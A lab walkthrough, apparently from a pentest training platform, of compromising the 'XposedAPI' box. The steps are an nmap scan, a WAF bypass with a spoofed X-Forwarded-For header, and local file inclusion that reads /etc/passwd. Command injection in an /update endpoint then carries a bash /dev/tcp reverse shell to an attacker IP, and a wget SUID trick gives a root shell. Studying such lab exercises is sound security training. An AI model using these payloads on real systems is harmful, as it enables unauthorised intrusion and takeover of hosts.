# XposedAPI

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 192.168.183.134
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 22:46 +08
Nmap scan report for 192.168.183.134
Host is up (0.18s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
13337/tcp open  unknown
```

This box likely has some API exploitation, so we can start proxying traffic through Burp.&#x20;

### API --> RCE

Port 13337 shows some basic documentation for an API:

<figure><img src="../../../.gitbook/assets/image (3625).png" alt=""><figcaption></figcaption></figure>

The most interesting was the `/update` endpoint, which accepted a user-controlled URL and says it updates the application via a 'Linux Executable'. This might be vulnerable to RCE if we can chain commands to the end of the URL.&#x20;

But we didn't have a username yet. There's also a `/logs` endpoint:

<figure><img src="../../../.gitbook/assets/image (2572).png" alt=""><figcaption></figcaption></figure>

Attempting to visit it results in a WAF blocking us:

```
$ curl http://192.168.183.134:13337/logs
WAF: Access Denied for this Host.
```

Since the application mentioned that this is meant to be open to `localhost` only, we can try appending the `X-Forwarded-For` header.&#x20;

```
$ curl http://192.168.183.134:13337/logs -H 'X-Forwarded-For: localhost'
Error! No file specified. Use file=/path/to/log/file to access log files.
```

This looks vulnerable to LFI, and it works!

{% code overflow="wrap" %}
```
$ curl http://192.168.183.134:13337/logs?file=/etc/passwd -H 'X-Forwarded-For: localhost
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
clumsyadmin:x:1000:1000::/home/clumsyadmin:/bin/sh
```
{% endcode %}

There's a `clumsyadmin` user present, and this might be the user we need. Then, we can use the `/update` endpoint to send requests to our HTTP server:

<figure><img src="../../../.gitbook/assets/image (203).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

Since our parameters was being passed to a 'Linux Executable', I assumed that the URL parameter was not being properly sanitised (and is probably using `wget` or something).&#x20;

To test, I sent this JSON data:

```json
{"user":"clumsyadmin","url":"http://192.168.45.184/hiiamssrf; wget 192.168.45.184/hiiamrce"}
```

<figure><img src="../../../.gitbook/assets/image (525).png" alt=""><figcaption></figcaption></figure>

This confirms we have RCE. We can get a reverse shell via this JSON object:

```json
{"user":"clumsyadmin","url":"http://192.168.45.184/hiiamssrf; bash -c 'bash -i >& /dev/tcp/192.168.45.184/21 0>&1'"}
```

<figure><img src="../../../.gitbook/assets/image (714).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Wget SUID Binary

I searched for SUID binaries on the machine, and found that `wget` was one of them:

```
clumsyadmin@xposedapi:~$ find / -perm -u=s -type f 2>/dev/null
<TRUNCATED>
/usr/bin/wget
<TRUNCATED>
```

Using this, we can get a `root` shell:

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh -p\n/bin/sh -p 1>&0' >$TF
wget --use-askpass=$TF 0
```

<figure><img src="../../../.gitbook/assets/image (3423).png" alt=""><figcaption></figcaption></figure>
